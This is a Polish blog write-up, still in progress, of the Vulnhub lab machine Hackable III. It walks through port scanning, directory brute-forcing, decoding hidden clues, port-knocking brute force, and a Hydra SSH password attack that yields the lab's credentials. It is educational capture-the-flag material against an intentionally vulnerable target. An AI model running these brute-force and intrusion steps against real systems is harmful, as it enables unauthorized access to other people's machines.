---
title: "Hackable: III - in progress"
excerpt: " "
comments: true
categories:
  - Hacking
tags:
  - Hacking
  - Vulnhub
header:
  overlay_image: /assets/images/pasek-hack.png
gallery1_2:
  - url: /assets/images/hacking/2021/06/01.png
    image_path: /assets/images/hacking/2021/06/01.png
  - url: /assets/images/hacking/2021/06/02.png
    image_path: /assets/images/hacking/2021/06/02.png
gallery3:
  - url: /assets/images/hacking/2021/06/03.png
    image_path: /assets/images/hacking/2021/06/03.png
gallery4_5:
  - url: /assets/images/hacking/2021/06/04.png
    image_path: /assets/images/hacking/2021/06/04.png
  - url: /assets/images/hacking/2021/06/05.png
    image_path: /assets/images/hacking/2021/06/05.png
---
# Wstęp
[Hackable III](https://www.vulnhub.com/entry/hackable-iii,720/)  jest najnowszą maszyną od [Eliasa Soulsa](https://www.vulnhub.com/author/elias-sousa,804/) (stan na lipiec 2021). Oznaczona jest poziomem **medium**. Nie jest tak łatwa, jak opisywane wcześniej maszynki. Jest bardzo podchwytliwa i straciłem nad nią dosyć dużo czasu, ale człowiek uczy się całe życie. Metasploita będę używał, ale nie jest on tutaj głównym narzędziem. Mała uwaga, na XCP-ng musisz nazwę interfejsu sieciowego zmienić w dwóch miejscach. Rozwiązanie podaje na końcu, gdyż to może komuś zepsuć zabawę.
{: .text-justify}
## Zaczynamy
```bash
msf6 > db_nmap -A -p- 172.16.1.103
host          port  proto  name  state     info
----          ----  -----  ----  -----     ----
172.16.1.103  22    tcp    ssh   filtered
172.16.1.103  80    tcp    http  open      Apache httpd 2.4.46 (Ubuntu)
```
Mamy dwa porty, 80 i 22. Jeden jest filtrowany. Zacznijmy od www. Wchodząc na stronę mamy takie coś (Kierujemy się na górny lewy róg) i mamy menu.
{: .text-justify}
{% include gallery id="gallery1_2"  %}
Logowanie nic nam nie daje. W kodzie źródłowym (http://172.16.1.103/login_page/login.html) jest informacja, że to może do końca nie działać: *This page is not ready, may give error*. Bawiąc się Burpsuitem i odpalając powyższy link, Burpsuite kieruje nas do  http://172.16.1.103/login.php, a tam jest coś dziwnego, zamiast wyniku z logowania, dostajemy kod źródłowy w PHP. Z początku myślałem, że to jest ułatwienie dla pentestera i PHP nam wyświetla tę informacje, żeby ułatwić zadanie, ale nie. Niezależnie jakie parametry podasz, to jest zwykły kod w HTML-u, tyle że ma rozszerzenie php! Na nic się zda wstrzykiwanie parametrów. Zanim do tego doszedłem minęło trochę czasu, ale to był ciekawy pomysł autora.
{: .text-justify}
{% include gallery id="gallery3"  %}
Sprawdźmy co jest jeszcze na na tym serwerze www:
{: .text-justify}
```bash
root@kali:/home/szikers# gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://172.16.1.103 -x php,txt,html,htm,png,jpg,
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.1.103
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html,htm,png,jpg,
[+] Timeout:                 10s
===============================================================
2021/07/30 18:44:19 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1095]
/home.html            (Status: 200) [Size: 11327]
/login.php            (Status: 200) [Size: 487]
/3.jpg                (Status: 200) [Size: 61259]
/css                  (Status: 301) [Size: 310] [--> http://172.16.1.103/css/]
/js                   (Status: 301) [Size: 309] [--> http://172.16.1.103/js/]
/config               (Status: 301) [Size: 313] [--> http://172.16.1.103/config/]
/config.php           (Status: 200) [Size: 507]
/backup               (Status: 301) [Size: 313] [--> http://172.16.1.103/backup/]
/robots.txt           (Status: 200) [Size: 33]
/imagens              (Status: 301) [Size: 314] [--> http://172.16.1.103/imagens/]
/login_page           (Status: 301) [Size: 317] [--> http://172.16.1.103/login_page/]
/server-status        (Status: 403) [Size: 277]

===============================================================
2021/07/30 18:48:55 Finished
=============================================================== 
```
## Zawartość
**http://172.16.1.103/backup/**

wordlist.txt – pewnie hasła użytkowników
{: .notice--info}
**http://172.16.1.103/config/**

1.txt - tekst zakodowany w Base64 **MTAwMDA=**
{: .notice--info}
Szybkie dekodowanie:
```bash
echo MTAwMDA= | base64 -d
10000
```
**http://172.16.1.103/css/**

2.txt – tutaj mamy kod w Brainfuck. Można to odkodować poprzez stronę, albo przez program Beef.
**++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>------------------....**
{: .notice--info}
```bash
root@kali:/home/szikers# beef 2.txt
4444
```
**http://172.16.1.103/3.jpg**

3.jpg - jest to plik graficzny, a w nim pewnie ukryty przekaz. Nie miałem wcześniej do czynienia z łamaniem obrazków, więc nie rozkminiłem tej zagadki, ale Elias Sousa mi podpowiedział. 
{: .notice--info}
Binwalk nie znalazł nic ciekawego.
```bash
root@kali:/home/szikers/hackable3/3# binwalk 3.jpg

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01

```
Za to Steghide już coś pokazał:
```bash
root@kali:/home/szikers/hackable3/3# steghide info 3.jpg
"3.jpg":
  format: jpeg
  capacity: 3.6 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase:
  embedded file "steganopayload148505.txt":
    size: 12.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
root@kali:/home/szikers/hackable3/3# steghide extract -sf 3.jpg
Enter passphrase:
wrote extracted data to "steganopayload148505.txt".
root@kali:/home/szikers/hackable3/3# cat steganopayload148505.txt
porta:65535 root@kali:/home/szikers/hackable3/3#
root@kali:/home/szikers/hackable3/3#
```
Przy okazji mamy podpowiedź, że chodzi o **port** 65535:
{: .text-justify}
Podsumowując mamy:
- 10000
- 4444
- 65535

## Knockd 
Zanim znalazłem trzecią cyfrę w obrazku, użyłem metody brute-force. Jest ona powolna i robiona na siłę, ale działa.
{: .text-justify}
{: .notice--info}
Spróbowałem wejść przez Ssh, ale była blokada. Jeszcze raz przejrzałem kody, przeczytałem notatkę: *Please, jubiscleudo, don't forget to activate the port knocking when exiting your section, and tell the boss not to forget to approve the .jpg file - dev_suport@hackable3.com*  i nagle mnie olśniło. Do blokowania Ssh używa się Knockd (Trzeba zainstalować w Kali). Bez podania odpowiednich „zapukań” dostęp do Ssh będzie utrudniony. Zazwyczaj podaje się 3 parametry w przeciągu 5 sekund. Dwa pierwsze mamy. 10000 i 4444. Trzeci być może gdzieś jest w tej maszynie, szukałem w pliku 3.jpg, ale nie znalazłem (jak znajdę, zmienię ten wpis). Nie mamy trzeciego numeru, ale możemy spróbować bruteforce, chociaż to może potrwać parę dni. Jest 65536 możliwości (0-65535) na trzeci numer. Napisałem szybko skrypcik.
{: .text-justify}
```bash
#!/bin/bash
for i in {0..65535}; do
knock -v 172.16.1.103 10000 4444 $i
sleep 5
done
#--------- 
```
I co? Nie działa (prawdę mówiąc nie czekałem tyle dni). Niestety to była wina maszyny i XCP-ng. Znalazłem w logach, że knockd nasłuchiwał na ensp03, zamieniłem na eth0. Po zakończeniu działania powyższego skryptu Ssh działał! Jak nie chcesz czekać na wynik, możesz od razu zastukać
```bash
knock -v 172.16.1.103 10000 4444 65535
```
## Hydra 
Użytkownikiem zapewne jest **jubiscleudo**, a hasło pewnie jest w **wordlist.txt**. Użyjmy Hydry:
{: .text-justify}
```bash
hydra -V -T 64 ssh://172.16.1.103 -l jubiscleudo -P wordlist.txt

[ATTEMPT] target 172.16.1.103 - login "jubiscleudo" - pass "maria" - 204 of 303 [child 15] (0/3)
[ATTEMPT] target 172.16.1.103 - login "jubiscleudo" - pass "onlymy" - 205 of 303 [child 13] (0/3)
[ATTEMPT] target 172.16.1.103 - login "jubiscleudo" - pass "gabriela" - 206 of 303 [child 4] (0/3)
...
[22][ssh] host: 172.16.1.103   login: jubiscleudo   password: onlymy
```
Jak widzimy mamy użytkownika **jubiscleudo** i hasło **onlymy**. Wejdźmy na shella.
{: .text-justify}
## Shelltris
W katalogu **scripts** jest plik **tetris.sh**. Po uruchomieniu brakuje w nim pliku getch i program blokuje cały system. Popatrzyłem na kod źródłowy i zobaczyłem, że oryginalny nazywa się **ShellTris**. Ściągnałem cały [kod](https://shellscriptgames.com/shelltris/tarballs/shelltris-1.1.tar.gz). Skompilowałem na swoim shellu plik **getch.c**. I nic. Nie ma root-a. Pliki mają identyczną zawartość, ale być coś może nasłuchuje i sprawdza? (Elias Souls mi wspomniał, że Shelltris to pułapka. 😏) Być może za jakiś czas rozwiążę problem, jak nie, to pewnie zrobi to ktoś inny. Jeżeli znalazłeś rozwiązanie to napisz [kerszi@protonmail.com](mailto:kerszi@protonmail.com). 
{: .text-justify}
{% include gallery id="gallery4_5"  %}
Uwaga, jeżeli chcesz, żeby ta maszyna działała na XCP-ng trzeba podczas startu systemu zmienic w Grubie ro na rw init=/bin/bash, potem F10, w /etc/netplan/00-installer-config.yaml zmieniamy na interfejs eth0. Dodatkowo należy zmienić w /etc/default/knockd na KNOCKD_OPTS="-i eth0".
{: .text-justify}
{: .notice--danger}
